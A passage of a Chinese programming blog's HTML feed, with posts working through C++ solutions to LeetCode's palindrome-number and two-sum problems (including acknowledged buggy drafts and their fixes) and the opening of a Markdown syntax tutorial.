class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>( x &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">            <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(x &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                v.<span class="built_in">push_back</span>(x%<span class="number">10</span>);</span><br><span class="line">                x /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> len= v.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len/<span class="number">2</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = len<span class="number">-1</span>; j &gt; len/<span class="number">2</span>; j--)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(v[i] == v[j])</span><br><span class="line">                        num++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num == len/<span class="number">2</span>)</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再提交一次：</p><img src="/2022/04/08/leetcodeno9/002.png" class=""><p>额，这就很尴尬了，简单测试了一下，发现是我的思路出问题了，因为我拆成两份算的时候考虑的是这个数是奇数位数而不是偶数位数……<br>调整的时候注意到一个问题。。预期对半算，不如直接i和len算</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(v[i] == v[len-i])</span><br><span class="line">        num++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先测试一下。。发现还是有点问题，就是因为len是元素个数，但是实际上vector[]重载跟数组一下都是从0开始，这就导致len得先-1，放在循环里反而不合适了。所以对上面的len&#x3D;size的时候就-1，这代码就跟屎山一样现在堆积在一起。测了一下，0不起作用，其他都行了，因为我while的时候判断条件就是x&gt;0，所以就很扯淡。这里直接用elseif套过去先，看看能不能通过。合并之后的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>( x &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>( x == <span class="number">0</span> )&#123;</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">            <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(x &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                v.<span class="built_in">push_back</span>(x%<span class="number">10</span>);</span><br><span class="line">                x /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> len= v.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(v[i] == v[len-i])</span><br><span class="line">                    num++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num == len)</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/04/08/leetcodeno9/003.png" class=""><blockquote><p>通过是通过了，但是这个时间和空间效率真的惨不忍睹，这大概就是陷进去了。不过在用while拆解x的时候突然想到一个点。在后面优化一下看看。</p></blockquote><hr><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p>回望屎山，满目鄙夷之色。。。。hhh,真的是人太菜。</p><p>回归正题，在将x不断%10拆解的时候，我那会就在想，如果用一个变量&#x3D;<code>x%10+变量*10</code>，这样的话，例如x&#x3D;121的时候，我创建一个变量n；</p><blockquote><p>n &#x3D; 121%10 + n*10，此时n &#x3D; 1;<br>然后将x&#x2F;10，再重复上步骤,<br>n &#x3D; 12%10 + n*10; 这个时候n &#x3D; 12;<br>在x&#x2F;10重复,<br>n &#x3D; 1%10 + n*10; n &#x3D; 121;</p></blockquote><p>这样直接if(n &#x3D;&#x3D; x)好像就完事了。</p><p>0-9结果都一样，也不用再加什么elseif了。</p><p>浓缩后的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(x &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            n = x%<span class="number">10</span> + n*<span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(x == n)</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后测试了一下。。发现好像就0是对的，又看了几遍看出了点门道。。我的x被我一直&#x2F;10，后面变成0了。。。。难怪<code>if(x == n)</code>怎么没变化。。，</p><p>找个变量先复制x的值就行了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> y = x;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(x &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            n = x%<span class="number">10</span> + n*<span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(y == n)</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>决定命运的时刻来了，提交看看：</p><img src="/2022/04/08/leetcodeno9/004.png" class=""><p>额，真是坎坷啊，它提示好像溢出了，也是哦，题目提示的范围是-2<sup>31</sup> &lt;&#x3D; x &lt;&#x3D; 2<sup>31</sup> - 1,<br>那也就是说要把n的类型改成long int应该就行了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> y = x;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(x &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            n = x%<span class="number">10</span> + n*<span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(y == n)</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最后执行效率：</p><img src="/2022/04/08/leetcodeno9/005.png" class=""><p>时间好像挺叼的了，空间拉不满应该是我用了long int的问题，不过最后还是取决与服务器之间的联系吧，多测一下好像最好的内存占用也是5.6mb，然后时间会从0ms-12ms浮动，不知道是不是网络波动的问题。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>不得不感慨。。有的时候屎山写着写着找到金子了好像。。</p><p>去看了看评论。第一条就是对题目的批评：</p><img src="/2022/04/08/leetcodeno9/006.png" class=""><p>也难怪。。毕竟这个回文数没想到会这么大。。利用*10往上推是会出现这样的问题。</p><p>然后就是感觉能稍微优化一下空间和省略一个if哎，评论里大多都是直接return n&#x3D;&#x3D;x这样，这样雀食省了我定义一个bool变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> y = x;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(x &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            n = x%<span class="number">10</span> + n*<span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> y == n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>几轮刷新提交最好情况内存也就是5.6MB，好像没有太大区别，时间反而除了第一次的0ms，其他最好表现都是4ms了，不过问题不大。</p><p>同样的也看到了之前用string的，也就是我开头说的一个问题，int转换成string的函数是带来的新特性还是标准库函数，但是我个人还是不赞成去用这种方法。</p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode第一题</title>
      <link href="/2022/04/06/leetcodeno1/"/>
      <url>/2022/04/06/leetcodeno1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><img src="/2022/04/06/leetcodeno1/000.png" class=""><p>有人相爱，有人夜里开车看海，有人连leetcode第一题都做不出来。—— 摘自评论</p><span id="more"></span><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>没啥参考的，用到啥函数了就回头看看。毕竟记得不是很清楚。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><img src="/2022/04/06/leetcodeno1/001.png" class=""><p>从题目要求里看形式就像输入一个数组和一个目标数，求数组中哪两个成员能组合成这个目标数。</p><p>默认给的模板是：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>估计是因为c++ 有stl思想，所以不用数组，而使用容器vector</p></blockquote><h2 id="初解"><a href="#初解" class="headerlink" title="初解"></a>初解</h2><p>暴力解法我们肯定想到的是两层for循环直接挨个if过来<br>实现：<br>时间复杂度按照这样说好像就是<code>T(n)=O(n^2)</code>;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;nums.<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]+nums[j]==target)&#123;</span><br><span class="line">                    n.<span class="built_in">push_back</span>(i);</span><br><span class="line">                    n.<span class="built_in">push_back</span>(j);</span><br><span class="line">                    <span class="keyword">return</span> n; <span class="comment">//或者直接break结束循环，反正最后都要返回。</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>最初的时候想创建一个数组返回的，但是题目用的好像是vector，也就凑合用了，后面看了下评论，发现return居然能返回{}，这样的一组数据，就感觉很新奇也很离谱。。毕竟传统概念return都是返回一个变量或者值</p></blockquote><h3 id="的解释"><a href="#的解释" class="headerlink" title="{}的解释"></a>{}的解释</h3><p>后面多看了几个评论，发现类似传递的规则，应该是默认将{}转换成这个函数类型相符的了，比如java的可能是public int[] twoSum，那么return的是，默认就是return int[] {i,j}.</p><p>至于为什么这么说呢，因我自己试了一下：</p><img src="/2022/04/06/leetcodeno1/007.png" class=""><p>是可以通过测试，并且提交也是正确的，那么ok就不用管这么多了，<strong>虽然感觉在实际的面试中应该出的题目会和这个不太一样，如果有需要开辟就开辟下新的空间用吧。</strong></p><hr><h2 id="调试初解"><a href="#调试初解" class="headerlink" title="调试初解"></a>调试初解</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; nums.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] + nums[j] == target)&#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;i,j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>故此这里开始都使用{}的方法，这样雀食省了空间，但是还没搞懂为什么能这么用，看后续能不能看到</p></blockquote><p>运行代码的时候发现输出和预期结果不一样：</p><img src="/2022/04/06/leetcodeno1/002.png" class=""><p>看了一下发现j不应该也从0开始，浪费了，那么把j的初始化设置为1；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; nums.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] + nums[j] == target)&#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;i,j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再次执行测试：</p><img src="/2022/04/06/leetcodeno1/003.png" class=""><p>哎发现可以了，提交看看</p><p>哎然后，然后就报错了。。</p><img src="/2022/04/06/leetcodeno1/004.png" class=""><p>又看了一下题目:<strong>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</strong><br>原来是不允许重复啊。那么在if里面在判断一次i！&#x3D; j即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; nums.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] + nums[j] == target &amp;&amp; i != j)&#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;i,j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提交代码：<img src="/2022/04/06/leetcodeno1/005.png" class=""><br>ok通过了。。但是这个执行用时才击败了5.12%的用户也太搞了。。不得不感慨人和人之间的差距。</p><hr><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>又看了下我的代码，看看哪能优化一丢丢，想了想，在i和j那里可以做做手脚。<br>比如测试样例是nums&#x3D;[2,5,5,11],target&#x3D;10;<br>我i肯定是从0开始，但是j呢，从1开始是没啥问题，但是如果</p><ul><li>第一次i&#x3D;0，j就从1-end。</li><li>第二次i&#x3D;1，j还是从1-end。</li><li>第三次i&#x3D;2，j还是从1-end。</li></ul><p>这样以来就能简单的看出问题所在之处了。</p><p>所以我们的j应该是&#x3D;1+i，这样一来</p><ul><li>第一次i&#x3D;0，j&#x3D;1+0 —— end</li><li>第二次i&#x3D;1，j&#x3D;1+1 —— end</li><li>第三次i&#x3D;2，j&#x3D;1+2 —— end</li></ul><p>这样可以说大小省略掉一半的时间了。</p><p>简单修改一下代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; nums.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] + nums[j] == target &amp;&amp; i != j)&#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;i,j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再次提交：<img src="/2022/04/06/leetcodeno1/006.png" class=""></p><p>果然时间效率优化了不少，内存依旧是在9.8和9.9徘徊是正常的。</p><hr><h2 id="在优化——load"><a href="#在优化——load" class="headerlink" title="在优化——load"></a>在优化——load</h2><p>目前好像还没想到小于O(n^2)的办法，等哪天想到了再来改一下，因为怎么样都是要都举一遍</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>leetcode的测试感觉。。还得顺带看看服务器心情哈哈哈</p><img src="/2022/04/06/leetcodeno1/008.png" class=""><p>一样的的代码，结果每次都不相同哈哈哈哈</p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown基本语法</title>
      <link href="/2022/03/27/Markdown/"/>
      <url>/2022/03/27/Markdown/</url>
      
        <content type="html"><![CDATA[<!--# markdown基本语法--><span id="more"></span><hr><h1 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h1><p>不知道是不是主题的问题，很多markdown能支持的在转换成html的时候全失效了。<br>所以以下的语法如果也在此主题无法使用，建议直接使用html的方法，虽然时间成本比较高。<br>但是目前确实没有很好的解决办法，本人对js和css忘得差不多了，所以没有能力完全审计源代码。</p><hr><h2 id="1-标题"><a href="#1-标题" class="headerlink" title="1.标题"></a>1.标题</h2><p>标题的等级由#构成，#号越多对应的标题大小越小，就是类似html语法的h1-h6</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一级标题</span></span><br><span class="line"><span class="comment">## 二级标题</span></span><br><span class="line"><span class="comment">### 三级标题</span></span><br><span class="line"><span class="comment">#### 四级标题</span></span><br><span class="line"><span class="comment">##### 五级标题</span></span><br><span class="line"><span class="comment">###### 六级标题</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>值得注意的是，#号后面建议跟个空格，某些平台可能不用</p></blockquote><p>效果如下<code>(主题可能重写过，所以效果可能与其他平台略有差异)</code>：</p><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><hr><h2 id="2-字体"><a href="#2-字体" class="headerlink" title="2.字体"></a>2.字体</h2><p>常用修饰方法就是，粗体和斜体，然后两者结合粗斜体<br>markdown中，<code>\-</code>和<code>\*</code>的用法差不多</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*斜体文本*</span><br><span class="line">_斜体文本_</span><br><span class="line"></span><br><span class="line">**粗体文本**</span><br><span class="line">__粗体文本__</span><br><span class="line"></span><br><span class="line">***粗斜体文本***</span><br><span 